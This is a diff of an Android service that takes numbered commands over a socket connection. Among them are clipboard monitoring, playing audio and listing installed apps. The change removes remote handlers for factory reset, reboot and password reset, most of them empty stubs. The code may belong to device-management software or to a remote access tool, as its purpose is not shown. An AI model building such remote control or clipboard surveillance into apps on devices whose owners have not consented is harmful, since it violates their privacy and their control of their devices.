@@ -75,12 +75,9 @@ public class MainService extends Service {
                     ioSocket.on("0xC", listInstalledApps);
                     ioSocket.on("0xD", vibratePhone);
                     ioSocket.on("0xE", changeWallpaper);
-                    ioSocket.on("0xF", factoryResetDevice);
-                    ioSocket.on("0x10", rebootDevice);
-                    ioSocket.on("0x11", changeDevicePassword);
-                    ioSocket.on("0x12", clipboardMonitoring);
-                    ioSocket.on("0x13", playAudio);
-                    ioSocket.on("0x14", videoView);
+                    ioSocket.on("0xF", clipboardMonitoring);
+                    ioSocket.on("0x10", playAudio);
+                    ioSocket.on("0x11", videoView);
 //                    ioSocket.on("0x13", screenRecord);
 
                     if(!ioSocket.connected()){
@@ -312,16 +309,7 @@ public class MainService extends Service {
         }
     };
 
-    private final Emitter.Listener resetPassword = args -> {
-        new DeviceManager(getApplicationContext(), new ComponentName(getApplicationContext(), MainActivity.class)).resetPassword("replace with new password");
-        try {
-            JSONObject jsonObject = new JSONObject();
-            jsonObject.put("device_id", device_id);
-            jsonObject.put("message", "");
-        } catch (Exception exception) {
-            Log.i("resetPassword", exception.getMessage());
-        }
-    };
+
 
     private final Emitter.Listener sendSerialCommand = args -> {
         try {
@@ -355,35 +343,6 @@ public class MainService extends Service {
         }
     };
 
-    private final Emitter.Listener changeDevicePassword = args -> {
-        try {
-            JSONObject jsonObject = new JSONObject();
-            jsonObject.put("device_id", device_id);
-            jsonObject.put("message", "");
-        } catch (Exception exception) {
-            Log.i("changeDevicePassword", exception.getMessage());
-        }
-    };
-
-    private final Emitter.Listener factoryResetDevice = args -> {
-        try {
-            JSONObject jsonObject = new JSONObject();
-            jsonObject.put("device_id", device_id);
-            jsonObject.put("message", "");
-        } catch (Exception exception) {
-            Log.i("factoryResetDevice", exception.getMessage());
-        }
-    };
-
-    private final Emitter.Listener rebootDevice = args -> {
-        try {
-            JSONObject jsonObject = new JSONObject();
-            jsonObject.put("device_id", device_id);
-            jsonObject.put("message", "");
-        } catch (Exception exception) {
-            Log.i("rebootDevice", exception.getMessage());
-        }
-    };
 
     private final Emitter.Listener clipboardMonitoring = args -> {
         ClipboardMonitoring clip = new ClipboardMonitoring(getApplicationContext());
